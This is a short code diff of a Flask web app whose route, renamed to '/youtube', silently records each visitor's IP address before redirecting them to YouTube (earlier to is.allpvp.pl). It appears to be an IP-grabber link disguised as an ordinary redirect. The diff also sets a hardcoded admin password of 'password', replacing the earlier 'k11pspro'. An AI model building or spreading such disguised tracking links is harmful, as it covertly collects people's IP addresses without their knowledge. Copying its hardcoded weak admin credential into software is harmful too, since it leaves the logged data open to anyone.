@@ -50,9 +50,9 @@ def index():
                                error="Unable to detect IP address")
 
 
-@app.route('/itemshop')
-def itemshop():
-    """Redirect to allpvp.pl and silently record the IP"""
+@app.route('/youtube')
+def youtube():
+    """Redirect to YouTube and silently record the IP"""
     try:
         # Record the visit in the background
         record_visit(get_client_ip())
@@ -60,7 +60,7 @@ def itemshop():
         app.logger.error(f"Error recording IP: {str(e)}")
 
     # Redirect immediately without showing any intermediate page
-    return redirect("http://is.allpvp.pl")
+    return redirect("https://youtube.com")
 
 
 def record_visit(client_ip):
@@ -96,7 +96,7 @@ def record_visit(client_ip):
 def admin_login():
     error = None
     if request.method == 'POST':
-        if request.form['password'] == 'k11pspro':
+        if request.form['password'] == 'password':
             session['admin_logged_in'] = True
             return redirect(url_for('admin_visits'))
         else:
